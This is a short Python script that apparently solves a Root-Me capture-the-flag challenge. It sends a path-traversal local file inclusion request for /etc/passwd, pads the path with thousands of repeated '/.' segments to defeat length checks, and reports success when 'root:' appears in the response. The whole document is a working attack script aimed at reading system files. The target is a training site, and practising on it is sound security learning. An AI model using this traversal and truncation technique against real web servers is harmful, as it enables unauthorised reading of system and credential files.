import requests

def main():
	url="http://challenge01.root-me.org/web-serveur/ch35/index.php?page=a/../../../../../etc/passwd/."
	iteration=3000
	i=0
	while i<iteration:
		i=i+1
		url=url+i*'/.'
		print(url)
		rq = requests.post(url)
		if 'root:' in rq.text:
			print("LFI found")
		else:
			pass


main()
